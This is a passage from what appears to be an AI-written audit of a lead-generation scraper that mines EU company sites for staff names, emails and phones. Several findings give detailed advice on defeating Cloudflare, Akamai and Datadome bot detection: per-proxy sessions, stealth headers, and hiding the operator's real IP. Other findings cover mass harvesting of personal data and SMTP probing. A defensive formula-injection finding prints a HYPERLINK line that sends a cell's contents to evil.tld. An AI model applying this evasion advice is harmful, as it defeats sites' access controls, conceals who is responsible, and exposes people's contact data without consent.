**What happens.** `get()` passes `cookies=jar` per request, believing each proxy gets its own browser session. requests does not work that way: `Session.send` calls `extract_cookies_to_jar(self.cookies, ...)` on every response, so every Set-Cookie also lands in the shared `self._session.cookies`; and on the next request `merge_cookies(merge_cookies(RequestsCookieJar(), self.cookies), request_cookies)` sends the session jar *in addition to* the per-request jar. The per-proxy jars therefore never isolate — they only ever add. The result is the single most damaging anti-bot mistake possible with a rotating pool: a Cloudflare `cf_clearance` / `__cf_bm`, an Akamai `_abck` / `bm_sz`, or a Datadome cookie obtained through proxy A is presented from proxy B, C and D. The vendor sees one cookie identity arriving from N different IPs, which is the canonical rotation signature, and bans the whole pool at once. The docstring at line 8 ("Per-proxy cookie jar (each proxy looks like a distinct browser session)") is false.

**Failure.** The pool has 20 proxies. The crawler fetches zalando.de through proxy #1; Akamai sets `_abck` and `bm_sz`. The next 19 fetches of zalando.de go through proxies #2-#20 and every one of them presents proxy #1's `_abck`. Akamai's per-cookie IP-diversity check fires immediately and all 20 IPs are flagged. The operator sees the pool's block rate go from 30% to 100% and concludes the proxies are bad.

**Fix.** Do not share one Session across proxies. Keep a `dict[proxy_url -> requests.Session]` (each with its own connection pool, its own cookie jar, and `trust_env=False`), and dispose/recreate a session when its proxy is rotated out. That also fixes TLS session-ticket and connection reuse crossing proxies, which is a second correlation channel.

### Accept-Encoding advertises brotli that the declared dependency set cannot decode; brotli bodies are returned as garbage and cached as successes

`src/job_scraper/http.py:473` · silent-failure

**What happens.** `_stealth_headers` hardcodes `"Accept-Encoding": "gzip, deflate, br"` for every GET. Neither requirements.txt nor pyproject.toml declares `brotli`/`brotlicffi` (requests is pinned only as `requests>=2.31.0`, without the `[brotli]` extra). urllib3 builds `CONTENT_DECODERS` from what is importable; when brotli is absent, `BaseHTTPResponse._init_decoder` finds `"br"` is not in CONTENT_DECODERS, installs no decoder, and returns the *raw brotli bytes* — it does not raise. `response.text` then decodes those bytes as text with errors='replace', producing 80-350 KB of mojibake that contains no `<html`, no `<jobposting`, and none of the block keywords. `_looks_like_block` returns False (the body is far over the 5000-char threshold), so the garbage is treated as a successful fetch, `report_success` is called on the proxy, and the garbage is written into the SQLite cache where it is served for `cache_ttl_seconds` — 604800 (one week) in both lead configs. This reproduces only on a machine that installed from requirements.txt, i.e. precisely the employee machines. The dev machine happens to have brotli 1.2.0 installed globally from an unrelated package, which is why it is invisible here.

**Failure.** An employee sets up the tool with `pip install -r requirements.txt` in a clean venv. Every brotli-serving host — roughly half of modern EU sites — returns 89 KB of binary noise that the pipeline records as a 200 OK. Every extractor finds zero people, zero emails, zero job postings. The cache then serves that noise for a week, so re-running changes nothing. Nothing is logged as an error; `proxy_stats` shows perfect health; unit tests pass because they never decode a real brotli body.

**Fix.** Add `brotli>=1.1.0` (or `Brotli`, or `requests[brotli]`) to requirements.txt and pyproject dependencies. Better: stop hardcoding Accept-Encoding — build it from `urllib3.response.BaseHTTPResponse.CONTENT_DECODERS` at import time so the advertised set can never exceed the decodable set, and add a startup assertion that fails loudly if `br` is unavailable. Additionally, sanity-check decoded bodies (e.g. require a `<` in the first 1 KB for text/html) before caching.

### A robots.txt that answers 403 (every WAF-fronted EU host) marks the whole origin disallow_all, silently killing the host for the entire run

`src/job_scraper/robots.py:66` · silent-failure

**What happens.** `RobotsCache._fetch` treats an HTTP 403 on /robots.txt as RFC 9309's "auth-required, whole site off-limits" and sets `parser.disallow_all = True`. That parser is then cached per-origin for the life of the process. `HttpClient.get` consults `_robots_allow` at line 502 before anything else and returns `None` with only a `logging.debug("robots disallow %s")`. But a 403 on robots.txt from Cloudflare/Akamai/Imperva is not an auth requirement - it is the same bot wall the established facts already measured on the page itself. The robots fetch is made with `urllib.request.urlopen` carrying a bare `{'User-Agent': ua}` and none of the browser-like Accept / Accept-Language / Sec-Fetch-* / Sec-CH-UA headers that `HttpClient._stealth_headers` builds, so it is *more* likely to be walled than the page fetch that follows it. Both shipped lead configs set `obey_robots: true` (configs/leads/eu-it.yaml:42, configs/leads/swiss-it.yaml:15), so this is live in exactly the pipeline that is producing no leads. Nothing above DEBUG level ever says the host was dropped.

**Failure.** A lead run over EU company domains reaches www.zalando.de. The very first thing it does is fetch https://www.zalando.de/robots.txt over plain urllib. Akamai answers 403. RobotsCache caches disallow_all for the origin. Every subsequent request for that company - /impressum, /team, /ueber-uns, sitemap.xml, the homepage nav discovery - returns None from HttpClient.get without a single packet leaving the machine. The company is counted as `no_person_found` in the funnel. Three of six probed EU hosts behave this way, i.e. the pipeline self-blocks roughly half the WAF-fronted EU market before the proxy layer even gets a chance.

**Fix.** Fetch robots.txt through HttpClient (proxy pool, UA rotation, stealth headers, retries) rather than raw urllib. Treat 403 as "unknown - allow" the way 404/5xx already are, or at minimum only honour 403-as-disallow when the response also carries a WWW-Authenticate header; 401 alone is the RFC's real auth case. Log the decision at WARNING with the host so an operator can see a whole origin being dropped, and re-probe once per run rather than caching a wall verdict forever.

### robots.txt is fetched with urllib and completely bypasses the proxy pool, leaking the real egress IP on the first touch of every host

`src/job_scraper/robots.py:61` · anti-bot

**What happens.** `HttpClient` builds a `_ProxyPool` and threads `proxies=self._proxies_dict(proxy_entry)` through `get` and `post_json`. `RobotsCache._fetch` does not use HttpClient at all - it calls `urllib.request.urlopen` directly. urllib has its own proxy resolution (environment variables only) and knows nothing about the pool, its rotation, its health tracking or its per-proxy cookie jars. So for every origin the run touches, the *first* request - the robots.txt probe, made before any page fetch - goes out over the machine's real IP. On an employee laptop that is the employee's home or office IP. It also means the WAF fingerprints and rate-limits the real IP first, which is precisely the failure the whole proxy plan exists to prevent, and the pool's `_exhausted_warned` IP-leak warning (http.py:185) never fires because this path never consults the pool.

**Failure.** An operator finally configures `proxies:` in configs/leads/eu-it.yaml. The run starts, walks 3,000 company domains, and issues 3,000 robots.txt requests from the real IP before any proxied page request. The upstream WAFs see one IP asking for robots.txt on thousands of unrelated domains in minutes - a textbook crawler signature - and the real IP is blocklisted at the CDN level, which also degrades the operator's normal browsing. Zero of those requests appear in `proxy_stats()`.

**Fix.** Route robots.txt through `HttpClient.get(robots_url, allow_404=True, use_cache=False)` with robots checking disabled for that one call, so it inherits the proxy pool, the rotating UA, the stealth headers and the throttle. Keep the 512 KB read cap by checking Content-Length / truncating the returned text.

### A WAF 403 on robots.txt is misread as "site off-limits", silently dropping every URL on the host

`src/job_scraper/robots.py:66` · correctness

**What happens.** `_fetch` catches `HTTPError` and, for code 401 or 403, sets `parser.disallow_all = True` and returns that parser. `RobotsCache.is_allowed` then returns False for every URL on that origin, forever (the parser is cached per-origin for the life of the process). `HttpClient._robots_allow` is the very first statement in `get()`, so not a single byte is ever requested from that host. The code's justification ("RFC 9309: auth-required robots.txt means the whole site is off-limits") inverts the spec: RFC 9309 s2.3.1.3 classes the whole 400-499 range as "Unavailable" and says the crawler MAY access any resource; it is s2.3.1.4 (5xx/unreachable) that mandates complete disallow — and robots.py fails *open* on exactly that branch. So both branches are backwards. Critically, a 403 here is almost never an authentication boundary; it is the same Akamai/Cloudflare bot wall that produces the 403s in the lead famine, and this fetch is made by bare `urllib.request` with no Accept, no Accept-Language and no client hints, which is far more likely to be walled than the `requests` call would be.

**Failure.** A lead run reaches zalando.de, hellofresh.de or getyourguide.com. RobotsCache fetches robots.txt with urllib, gets 403 from the CDN bot wall, sets disallow_all. Every subsequent http.get() for that host returns None at line 502 before any request is made. cascade.py:62 sees a falsy response and returns silently. Three of six probed EU company domains are dropped entirely with zero network traffic and only a logging.debug line. configs/leads/eu-it.yaml has already had all five Bundesagentur targets deleted on the strength of this same misreading ("the API host answers robots.txt with HTTP 403, which RFC 9309 defines as the entire host being off-limits") — so the bug has already removed Germany's largest job board from the Europe config.

**Fix.** Follow RFC 9309 s2.3.1.3: treat the whole 4xx range (401 and 403 included) as "unavailable" -> return None, i.e. no rules, allow. If a fail-closed mode is wanted for genuine 401s, make it an explicit opt-in flag, and never apply it to 403 which is indistinguishable from a bot wall. Separately, fetch robots.txt with the same requests Session, proxy, and full browser header set used for content, so a WAF answer to robots.txt is at least as rare as a WAF answer to a page.

### robots.txt is fetched with bare urllib, bypassing the proxy pool entirely and leaking the operator's real IP to every new origin

`src/job_scraper/robots.py:61` · security

**What happens.** `RobotsCache._fetch` calls `urllib.request.urlopen` directly. It has no reference to `_ProxyPool`, no reference to the requests Session, and no proxy argument. Every distinct origin the crawler touches therefore produces at least one TCP connection from the machine's real egress IP before any proxied request is made. For a leadgen run that crawls thousands of company domains, that is thousands of direct connections from an employee's home/office IP — the exact exposure the proxy pool exists to prevent. `urllib.request` does honour HTTP_PROXY/HTTPS_PROXY environment variables, so the behaviour is silently environment-dependent: it may be proxied on one machine and direct on the next, with nothing in the logs to say which.

**Failure.** An employee runs `python run_leads.py --config configs/leads/eu-it.yaml` with a configured proxy pool. The pipeline resolves 800 company domains. Before the first proxied page fetch to each, RobotsCache opens 800 direct TLS connections from the employee's residential IP to 800 company domains — fully attributable, logged by each target's CDN, and correlatable with the proxied traffic that follows by timing and by the identical UA string.

**Fix.** Route robots.txt through HttpClient's own Session with a proxy from the pool (use a low-level fetch path that does not itself consult robots, to avoid recursion), or pass an explicit proxies dict and the full stealth header set into urlopen via a ProxyHandler-built opener. Also cap the body (ROBOTS_MAX_BYTES is already respected, keep it) and reuse the per-proxy identity.

### universal.PHONE_RX matches no national-format European phone number at all

`src/job_scraper/universal.py:36` · anti-bot

**What happens.** The non-international branch is `\b(?:0\d{1,3}[\s\-\.\(\)/]?){2,5}\d{2,4}\b`. The repeated group requires EVERY repetition to begin with a literal 0, but in real numbers only the first group (the trunk prefix) starts with 0. With a minimum of 2 repetitions, any number of the form "0AA BBB CCC" fails. Only `+`-prefixed numbers are found. It also means the common Austrian/German international form written as "0049 30 …" is never matched.

**Failure.** A German Mittelstand career page prints the HR contact as "Tel. 089 1234567" (no country code — the overwhelmingly common domestic convention). mine_contacts returns no phone at all, so recruiter_phone and application_phone are empty for the entire German long tail.

**Fix.** Require the leading 0 only once: `\b0\d{1,4}(?:[\s\-./]\d{2,5}){1,4}\b`, and add an `00`-prefixed international branch alongside the `+` branch.

### _valid_phone is applied AFTER _normalize_phone, so its "digit blob = ID" rule rejects every national number of 9-12 digits

`src/job_scraper/universal.py:341` · correctness

**What happens.** mine_contacts does `phones = [_normalize_phone(p) for p in ...]` then `phones = [p for p in phones if _valid_phone(p)]`. _normalize_phone strips all separators, leaving a pure digit string for any number without a leading '+'. _valid_phone then applies `if re.fullmatch(r"\d{9,12}", p): return False`, a heuristic meant to reject un-separated ID blobs in raw page text. Post-normalisation it rejects 100% of national-format numbers in that length band. '+'-prefixed numbers survive only because the '+' breaks the fullmatch.

**Failure.** Even after fixing PHONE_RX, a Swiss page listing "044 215 15 78" yields a normalised '0442151578' which _valid_phone discards as an ID. Fixing the regex alone would not restore a single national phone number.

**Fix.** Run the ID-blob / date-like checks against the RAW matched substring (before normalisation) and run only the digit-count and repeated-digit checks against the normalised form.

### universal._looks_like_job_page rejects German/French/Italian/Spanish/Dutch job pages, so universal_extract returns None on them

`src/job_scraper/universal.py:1064` · correctness

**What happens.** The path whitelist is `("/job", "/stilling", "/career", "/vacancy", "/joboffer", "/ad/")` — no /stellen, /stellenangebote, /karriere, /emploi, /offre, /carriere, /lavoro, /posizioni, /vacature, /empleo. The text-signal fallback is English + Norwegian plus exactly three German tokens ('aufgaben', 'anforderungen', 'deine aufgaben', two of which overlap) and needs 2 hits. A normal German page using the formal register ("Ihre Aufgaben" / "Ihr Profil" / "Wir bieten" / "Jetzt bewerben") scores 1 and is rejected. French and Italian pages score 0. universal_extract then returns None at its first line, so the smart-DOM extractor, the site-specific extractors, the seniority pass and the in-function contact merge never run.

**Failure.** Crawling a German employer's /stellen/<id> page: extract.py finds no JSON-LD, universal_extract bails out, and the only thing that still runs is deep_scrape's standalone mine_contacts call. company, location, employment_type, seniority, description and all site-specific fields come back empty.

**Fix.** Add EU path tokens (/stellen, /stellenangebot, /karriere, /emploi, /offre, /carriere, /lavoro, /posizioni, /vacature, /empleo, /position, /opening) and EU text signals (bewerben, stellenangebot, ihre aufgaben, ihr profil, wir bieten, postuler, candidature, votre profil, vos missions, candidatura, requisiti, requisitos). Better: share one gate with extract._is_likely_job_page instead of maintaining two that disagree.

### Every jobs.ch row is exported with jobs.ch's own operator support mailbox as the recruiter email

`src/job_scraper/universal.py:129` · data-quality

**What happens.** `mine_contacts` runs `EMAIL_RX.findall(html)` over the entire raw document with no scoping to the posting's own content, then promotes the first address matching `(jobs?|career|talent|recruit|hr|hiring|people|personal)` to `recruiter_email` and `application_email`. On jobs.ch the only non-junk address anywhere on a detail page is `service@jobcloud.ch` — JobCloud AG is the company that operates jobs.ch — and the substring "job" inside "jobcloud" makes the recruiter-flavour regex fire on it.

**Failure.** configs/sites/jobsch.yaml harvests ~1,469 Swiss postings with deep_scrape on. 100% of exported rows carry `recruiter_email=service@jobcloud.ch`. The contact column — the only column a lead list exists for — is worthless, and any outbound campaign built from it mails JobCloud's customer-service desk once per row.

**Fix.** Scope `mine_contacts` to the posting body (the JSON-LD description, or the `_find_contact_section` block, or the main-content node) rather than the whole document; never take `emails[0]` from arbitrary document order. Reject an address whose domain equals or is a known operator of the source board (jobcloud.ch for jobs.ch, schibsted/finn for finn.no, etc.), the same way `JUNK_EMAIL_HOSTS` already rejects sentry.io.

### The 'stop a jobs.ch posting inheriting another employer's data' fix is incomplete — 'Recruiter Area Deutsch' is still produced live

`src/job_scraper/universal.py:105` · correctness

**What happens.** Commit 02ea5c3 states it eliminated the nav-bar string "… Recruiter Area Deutsch Français English Login" being read as a person, by adding `_is_site_chrome` to `extract.py::_apply_recruiter`. That guard exists only in extract.py. `universal.py::mine_contacts` performs the same recruiter-name mining with no chrome guard at all, and `deep_scrape.py:181` calls `mine_contacts(html, ...)` on the full page as pass 3, filling any field extract.py left empty. So the exact string the commit claims to have fixed still reaches the CSV — via a different code path.

**Failure.** A jobs.ch run produces rows whose `recruiter_name` is the site's own navigation menu. Because the name also passes the leadgen person filters downstream, these become delivered "leads" — fabricated people, which is precisely what commit 25d5bc2 ("leadgen: do not invent people out of page furniture") also set out to stop.

**Fix.** Move `_is_site_chrome` (extract.py:1338) into a shared module and apply it inside `mine_contacts` before accepting any name/phone/email candidate; additionally restrict mining to the main content node and reject candidates whose tokens are UI vocabulary (Recruiter/Area/Login/Sitemap/Nettstedkart/Vis/Deutsch/Français).

### Pattern inference is fed raw, uncleaned, unattributed hits, so one bad pair kills every derived address on the domain

`src/leadgen/assemble.py:155` · correctness

**What happens.** `build_leads` collects anchors at lines 155-158 from the *raw* `hits` list with only an `is_role_account` test. It does not apply `_clean_hits` (which splits multi-person lines and rejects non-names) and it does not apply `_address_echoes` (the attribution test that `_resolve_email` line 69 applies, and whose comment explicitly describes this exact bug). `infer_pattern` (email/pattern.py:98-107) requires a pattern consistent with *every* example and returns ("", "") on any disagreement. So a single mis-attributed page-level mailbox, or a single un-split Impressum line, silently destroys pattern inference for the whole company — and every other named person there drops from inferred_high/medium (weight 26/16) to inferred_low (weight 8), or, under --no-guess, gets no email at all and is dropped by quota.py:93.

**Failure.** Verified by running the real code. A team page yields hits: (Anna Mueller, informatik.admin@firma.ch) — a shared inbox `is_role_account` does not recognise — plus (Rita Frei, rita.frei@firma.ch) and (Peter Schmid, no email). `infer_pattern` receives both pairs, they disagree, and returns ('', ''). Result: Anna -> anna.mueller@firma.ch inferred_low, Peter -> peter.schmid@firma.ch inferred_low — despite rita.frei@ proving the domain uses first.last. With --no-guess both get no email and are dropped entirely. Second verified case: an Impressum line "Dana Aleff, Erik Mueller" with email dana.aleff@firma.ch is passed to infer_pattern un-split; split_name yields first='Dana', last='Mueller', no pattern matches, inference returns ('',''). Cleaning the name first yields ('first.last','medium').

**Fix.** Build the anchor list from cleaned hits and only from addresses that pass attribution: run `_clean_hits(hits)` first, then append `(hit.name, hit.email)` only when `not is_role_account(hit.email) and _address_echoes(hit.email, hit.name)` — the same three conditions `_resolve_email` already uses to decide `published`. Anything that fails attribution is evidence about the page, not about the person, and must not vote on the domain's format.

### A blind first.last guess with zero anchors is exported as email_status="verified"

`src/leadgen/assemble.py:94` · data-quality

**What happens.** _resolve_email checks verdict.status == "ok" (line 94) and verdict.status == "catch_all" (line 100) BEFORE it checks the `guessed` flag (line 102). validate() returns "ok" for any domain that rejects the random probe local-part, which is most Google Workspace / M365 tenants. So on any such domain the `inferred_low` branch is unreachable, and an address invented by applying FALLBACK_PATTERN to a name — with no published address anywhere on the domain and no pattern evidence at all — is written to the CSV as "verified", scoring 36.0 versus 40.0 for a genuinely published address and 26.0 for a real anchored inferred_high (score/completeness.py:12-22). email_confidence is left empty. guess_without_anchor defaults to True (cli.py:386), so this is the default path.

**Failure.** Company acme.de publishes nobody's address. The crawler finds "Jürgen Böhm, CTO" on the team page. build_leads has no anchors, so pattern=="", guessed=True, candidate=juergen.boehm@acme.de. acme.de is on Google Workspace and 550s the probe local-part, so validate returns "ok". Verified by running build_leads with validate stubbed to EmailVerdict("ok"): output is `juergen.boehm@acme.de | status: verified | confidence: '' | evidence: {'person_email': 'guessed:first.last'}`. The buyer reads "verified" on a pure guess, and it outranks every anchored lead in the quota cut.

**Fix.** Move the `if guessed: return candidate, "inferred_low"` check above the "ok"/"catch_all" branches, so provenance (did we have evidence for this format?) decides the tier and the SMTP verdict can only demote, never promote. Rename the EmailVerdict "ok" status to something like "domain_validates_recipients" so no caller can mistake it for address verification.

### A run whose entire harvest fails still exports the old checkpoint and exits 0

`src/leadgen/cli.py:400` · silent-failure

**What happens.** The harvest phase and the export phase are completely decoupled. `candidates = checkpoint.all_leads()` reads every lead ever banked in the checkpoint file, regardless of whether this run harvested anything. Nothing between line 351 (`seed: %d listings total`) and line 400 checks that `listings`, `companies`, or the funnel are non-empty. `_collect_listings` (cli.py:82) swallows every adapter exception into a `log.warning`, and `http.get` returns `None` (not an exception) for 403, 429 and WAF blocks (src/job_scraper/http.py:539-560), so a fully blocked run produces zero listings, zero companies, an empty funnel — and then writes a full, successful-looking CSV of yesterday's leads and returns 0.

**Failure.** Day 1: a good run banks 8,000 leads in .cache/leadgen.sqlite and writes output/leads.csv. Day 2: the machine's IP is now blocked, every seed API 403s and every company domain serves a bot wall. `_collect_listings` logs 5 warnings, `listings` is [], `companies` is [], `process_companies([])` returns an empty Counter, the run logs `funnel: {}` — and then selects 1000 of yesterday's 8,000 banked leads, writes them to output/leads.csv, prints `wrote 1000 rows`, and exits 0. The operator ships the identical file again. On a fresh checkpoint the same total failure writes a header-only CSV and exits 2, which scripts/daily.sh:172 explicitly reports as "Done, but short of TARGET rows" — not a failure.

**Fix.** After the harvest block, fail loudly when the run harvested nothing: if `not args.select_only` and (`len(listings) == 0` or `len(companies) == 0` or `funnel["companies_with_people"] == 0`), log an error and return a distinct non-zero exit code (e.g. 4 = harvest produced nothing) rather than falling through to the export. Also surface `funnel` counts in the final printed summary next to `report.summary()`, and make daily.sh treat that code as a failure.

### A WAF 403 on the company homepage makes the whole company vanish from the run

`src/leadgen/company/domain.py:128` · anti-bot

**What happens.** resolve_domain accepts a candidate host only if `http.get(probe) is not None`. HttpClient.get returns None for 403 (http.py: `if response.status_code == 403: ... return None`), for 429, for any >=400, and for any body matching _BLOCK_KEYWORDS. So a bot wall is indistinguishable from "this host is not the company's site", and jobboard.build then returns None and logs "no own-domain, dropping". The company is discarded before person discovery even begins — and it is discarded despite the fact that the hint URL came from the job source and the host is almost certainly correct. The lead investigator measured 4 of 6 EU company domains serving 403 to a plain request; this is that measurement turning directly into lost companies.

**Failure.** A listing carries apply_url=https://www.hellofresh.de/careers/... hellofresh.de answers 403 to the homepage GET (measured, len 5663). resolve_domain tries https then http, gets None both times, returns "". jobboard logs "seed: no own-domain for 'HelloFresh SE', dropping" and the company never reaches resolve_people, even though its domain was known for certain from the hint.

**Fix.** Separate "is this host real and owned by the company" from "can we fetch its homepage right now". Accept the host on a successful DNS resolution plus any HTTP response at all (including 403/429) — have the probe use a status-returning call rather than one that maps blocks to None — and let the crawl stage deal with the wall. Never let an anti-bot response delete a company from the funnel.

### resolve_domain never checks that the site it accepted belongs to the company — company_name is an unused parameter

`src/leadgen/company/domain.py:105` · data-quality

**What happens.** resolve_domain(company_name, hints, http) takes the company name and never references it in the body (verified by inspecting the function source). The first hint host that is not on the hardcoded ATS_HOSTS denylist and returns any 2xx body wins. There is no title/Impressum/name-similarity check, no parked-page detection, and no check that the page mentions the company at all. ATS_HOSTS is a fixed list of ~70 hosts matched by exact-or-suffix, so the entire long tail of European job boards passes: karriere.at (the largest Austrian board), jobup.ch, jobscout24.ch, ostjob.ch, indeed.de / indeed.fr / indeed.nl (only indeed.com is listed), stepstone.at / .be / .nl (only stepstone.de is listed), monster.fr / monster.it, glassdoor.de, myworkdaysite.com, jobteaser.com, hellowork.com, nationalevacaturebank.nl. Once such a host is accepted as the company's own domain, the person cascade crawls the board operator's own Impressum and files the board's staff under the employer, and every generated address points at the board's domain.

**Failure.** A listing for "Acme GmbH" carries apply_url=https://www.karriere.at/jobs/123. is_company_site says True (karriere.at is not on the denylist), the homepage returns 200, and resolve_domain returns 'karriere.at'. Verified by running resolve_domain with a stub http: karriere.at, jobup.ch, indeed.de, stepstone.at and parked 'meier.com' are all returned as the company's own domain. The pipeline then mines karriere.at's Impressum and exports its managing director as Acme GmbH's CTO with an @karriere.at address.

**Fix.** After a candidate answers, require corroboration that it is this company: the page <title> / og:site_name / Impressum text must contain a normalised form of company_name (or the domain stem must match the normalised name), otherwise reject. Add a parked-page heuristic (body under ~2 KB, 'domain for sale', registrar parking nameservers). Replace the static ATS_HOSTS list with the denylist plus a rule that a host serving many distinct employers is never a company site.

### Career subdomains are returned as the company's mail domain, so 100% of that company's addresses are rejected for "no MX"

`src/leadgen/company/domain.py:93` · correctness

**What happens.** _registrable only lowercases and strips a leading "www."; it does not reduce a host to its registrable domain (no Public Suffix List, no label trimming). resolve_domain therefore returns whatever subdomain the hint used, and that string becomes CompanyContext.domain, which apply_pattern uses verbatim as the mail domain. Career subdomains are the single most common form of apply_url in DACH, and they almost never carry MX records. validate() then rejects every generated address with "domain has no MX record" and the company yields zero emails — silently, with no funnel counter distinguishing it from a company that genuinely has no mail.

**Failure.** apply_url=https://karriere.sap.com/job/1 -> company_domain='karriere.sap.com' -> all addresses are name@karriere.sap.com. Live MX check performed in this audit: sap.com has_mx=True but karriere.sap.com=False, jobs.sap.com=False, jobs.zalando.de=False, careers.hellofresh.de=False. Every lead for that employer is dropped at the MX gate even though the correct mail domain (sap.com) was one label away.

**Fix.** Compute the registrable domain with a Public Suffix List (publicsuffix2/tldextract, or a vendored PSL) and use that for the mail domain; keep the full host separately for crawling. As a cheap backstop, if the resolved host has no MX, retry the MX lookup against its parent domain before dropping the company.

### Every non-250 SMTP response — greylisting, rate limiting, IP blocklisting, refused MAIL FROM — is read as "this domain validates recipients"

`src/leadgen/email/validate.py:224` · correctness

**What happens.** is_catch_all returns `code in (250, 251)`, collapsing three distinct outcomes into two. A 4xx (greylist 450, 421 too-many-connections) is a temporary deferral that says nothing about the recipient; a 550 can mean "no such user" but equally "your IP is on a blocklist" or "sender rejected"; a 503 means our own MAIL FROM was refused. All of them return False, validate() then returns EmailVerdict("ok"), and assemble labels the lead "verified". The return code of server.mail() at line 222 is never checked, so a refused sender silently becomes a "verified" lead. Compounding this: the probe's MAIL FROM is verify@example.com, and example.com publishes a null MX (`0 .`) and `v=spf1 -all` — live-checked. Any receiving MTA that does SPF checking or sender-callout verification is guaranteed to reject that sender, which drives the code straight into this false-positive branch.

**Failure.** Run from an employee laptop whose IP is on a consumer-dynamic blocklist. mx.firma.de answers RCPT with 554 5.7.1 (IP blocked) or 450 (greylisted). is_catch_all returns False -> validate returns "ok" -> every invented address at firma.de ships as "verified". Verified with a stubbed smtplib: RCPT codes 450, 421, 554 and 503 all produce verdict="ok" -> CSV email_status=verified. The worse the egress reputation, the more "verified" leads the run produces.

**Fix.** Treat only 250/251 as catch-all, only a 550/551/553 with an "unknown user"-class enhanced code as genuine per-mailbox validation, and every 4xx, 421, 503, 554 and any 5xx mentioning the sender/IP as None (unknown). Check the MAIL FROM response code before RCPT and bail to None if it is not 2xx. Use a MAIL FROM at a domain that actually has MX and SPF-passes, not example.com.

### CSV formula injection: scraped text lands as a live formula in Google Sheets and Excel

`src/leadgen/export.py:33` · security

**What happens.** `write_csv` passes scraped strings straight to `csv.DictWriter.writerow` with no sanitisation of the spreadsheet formula prefixes `=`, `+`, `-`, `@`, TAB and CR. Every text field in a Lead (person_name, person_role, company_name, company_industry, tech_stack, company_city) is attacker-controlled: it comes from HTML on a third-party company website. docs/RUNBOOK-leads.md section 4 instructs the operator to import the file into Google Sheets, and tools/verify_leads.py — the gate scripts/daily.sh:160 runs before delivery — has no check for it either. `_stringify` (job_scraper/models.py:344) strips whitespace, so the common 'prefix with a space' mitigation would not survive even if someone added it.

**Failure.** A company team page contains `<p>=HYPERLINK("http://evil.tld?d="&A2,"click")</p>` in the job-title position. Verified with the real Lead/csv code path: the row is written as `"=HYPERLINK(""http://evil.tld?d=""&A2,""click"")"`. On `File > Import > Replace current sheet` in Google Sheets that cell becomes a live HYPERLINK formula that exfiltrates the neighbouring cell's contents (the lead's email) to evil.tld when clicked; in Excel the equivalent with DDE/WEBSERVICE is worse. A benign variant hits every run: a company literally named `+49 Consulting GmbH` renders as a #NAME? error or is coerced to a number, silently corrupting the deliverable.

**Fix.** Sanitise on write: for every value, if the first character is in `=+-@\t\r`, prefix it with a single apostrophe (or wrap as `'` + value) before handing it to the writer. Add the same check to tools/verify_leads.py as a hard failure so the daily gate catches any row that slips through.

### A blocked site and a site with no staff are the same value, and the company is then permanently checkpointed

`src/leadgen/person/cascade.py:57` · silent-failure

**What happens.** `http.get` returns `None` for robots-disallow, 429, 403 and `_looks_like_block` (src/job_scraper/http.py:539-566). `_harvest` swallows that with a bare `if not response: return`, and `resolve_people` has no return channel for 'I never actually read anything'. So `resolve_people` returns `[]` both when a site genuinely names nobody and when every single request was a bot wall. `pipeline.handle` then calls `checkpoint.record_company(company.domain)` unconditionally on line 61, *before* it knows whether anything was read, and increments `no_person_found`. `Checkpoint.seen_company` returns True forever after (`max_age_days` defaults to None -> `return True`), so on the next run the company is skipped with `already_done`. Per the lead investigator's own probe, 4 of 6 EU company domains serve a 403 to a plain request; every one of them is being written off permanently on first contact and reported in the funnel as 'this company has no people'.

**Failure.** Run the EU lead config against hellofresh.de. All 12 fetches return 403. resolve_people returns []. funnel records no_person_found=1, checkpoint records hellofresh.de as crawled. Tomorrow's run reports already_done=1 and never retries, even after a proxy is configured. Repeat across thousands of Cloudflare/Akamai-fronted EU domains and the run reports 'these companies publish no staff' while having read zero bytes of any of them.

**Fix.** `_harvest` must report an outcome, not just append hits: count pages attempted vs pages whose body was actually read. `resolve_people` should return that alongside the hits (or raise a distinct BlockedError). `pipeline.handle` must only call `checkpoint.record_company` when at least one page was genuinely read; when everything was blocked it should record a separate `blocked` funnel bucket and leave the company un-checkpointed so a later run (or a proxied run) retries it. `job_scraper.http.get` should also distinguish its None returns (e.g. return a small result object or set a per-call `last_status`) so callers can tell 404 from 403 from robots-denied.

### An Impressum's info@ mailbox is attributed to a named person and then wins the merge, destroying the domain's email pattern anchor

`src/leadgen/person/strategies/impressum.py:95` · data-quality

**What happens.** impressum.extract attributes the page-level address to the person whenever the page holds exactly one address: `page_emails[0] if len(page_emails) == 1 else ""`. On a German Impressum the one address is almost always `info@`/`kontakt@`. Two compounding effects follow. (1) `cascade.merge_hits` fills a field only when the existing value is empty (`if not getattr(existing, attribute) and getattr(hit, attribute)`), i.e. first-wins — and `/impressum` is the FIRST entry of `BY_COUNTRY['DE']` in paths.py, so it is fetched before `/team`. The Impressum's `info@` therefore beats the team page's real `a.schmidt@` for the same person. (2) `build_leads` collects pattern anchors from `hit.email`; after the merge the only email on the domain is a role account, `is_role_account` filters it, `infer_pattern` returns ('',''), and every person on that domain falls through to FALLBACK_PATTERN 'first.last' at inferred_low. A domain whose real format is `f.last` now exports `peter.wolf@` instead of `p.wolf@` for everyone.

**Failure.** firma.de uses f.last addresses, prints info@firma.de on its Impressum and a.schmidt@firma.de on its team page. The run exports Anna as anna.schmidt@firma.de (wrong, and labelled a guess even though her real address was published on the site) and Peter as peter.wolf@firma.de (wrong). Both bounce. The same single info@ does this to every person on the domain.

**Fix.** Two fixes, both needed. In impressum.py, only attribute the page-level address when `not is_role_account(address)` AND it echoes the extracted name (reuse `_email_belongs_to`); otherwise leave `email=''`. In cascade.merge_hits, stop taking first-wins for `email`: prefer a non-role-account address over a role account, and an address that echoes the name over one that does not, regardless of which strategy found it first.

### team.py assigns the first person's email and LinkedIn URL to every other person on the page

`src/leadgen/person/strategies/team.py:67` · data-quality

**What happens.** `_card_of` claims to 'climb to the smallest ancestor that plausibly wraps one person' but unconditionally climbs exactly 3 parents (stopping only at body/html/main/[document]). On ordinary team markup `<main><div class=grid><div class=card><h3>Name</h3>` that lands on the grid container holding *all* the cards. `card.find('a', href=mailto)` and `card.find('a', href=linkedin.com/in/)` then return the FIRST match in document order across the whole grid, so person #2..#N are each given person #1's mailbox and person #1's LinkedIn profile URL. The email is partly rescued downstream (assemble._address_echoes drops an address that does not echo the name) but the LinkedIn URL is never validated against the name — `build_leads` sets `person_linkedin=hit.linkedin` verbatim. The email is NOT rescued when the surnames collide, which is routine on family-firm and same-department team pages: `_email_belongs_to('h.mueller@firma.de','Petra Müller')` is True because 'mueller' is a substring of 'hmueller', so Petra Müller ships with the CEO's mailbox marked `published`.

